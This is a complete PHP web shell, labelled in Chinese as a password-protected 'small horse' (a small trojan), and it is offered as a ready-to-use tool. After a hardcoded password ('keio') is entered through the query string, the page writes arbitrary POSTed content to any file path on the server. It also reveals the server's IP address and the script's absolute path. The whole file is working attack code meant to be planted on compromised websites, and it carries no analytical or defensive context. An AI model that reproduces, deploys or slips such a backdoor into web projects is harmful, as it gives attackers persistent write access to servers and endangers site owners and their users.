<html>
<head>
<title>当前IP <?=$_SERVER['SERVER_NAME']?></title>
</head>
<style>
body{font-family:Georgia;}
#neirong{width:558px;height:250px;border=#0000 1px solid}
#lujing{font-family:Georgia;width:389px;border=#0000 1px solid}
#shc{font-family:Georgia;background:#fff;width:63px;height:20px;border=#0000 1px solid}
</style>
<body bgcolor="black">
<?php
$password="keio";/**这里修改密码**/
if ($_GET[pass]==$password){
  if ($_POST)
{
  $fo=fopen($_POST["lujing"],"w");
  if(fwrite($fo,$_POST["neirong"]))
   echo "<font color=red><b>成功写入文件!</b></font>";
  else
   echo "<font color=#33CCFF><b>写入文件失败</b></font>";
  
}
else{
echo "<font color=#CCFFFF>冰源独立编译php带密码小马</font>";
}
?><br><br>
<font color="#FFFF33">服务器IP及当前域名：<?=$_SERVER['SERVER_NAME']?>(<?=@gethostbyname($_SERVER['SERVER_NAME'])?>)<br>
当前页面的绝对路径:<?php echo $_SERVER["SCRIPT_FILENAME"]?>
<form action="" method="post">
输入文件路径:<input type="text" name="lujing" id="lujing" value='<?php echo $_SERVER["SCRIPT_FILENAME"]?>' />
<input type="submit" id="shc" value="写入数据" /><br />
<textarea name="neirong" id="neirong">
</textarea>
</form></font>
<?php
 }else{
?>
<form action="" method="GET">
<font color="#00FFCC">输入密码:<input type="password" name="pass" id="pass">


<input type="submit" name="denglu" value="开门" /></form>
<?php } ?>
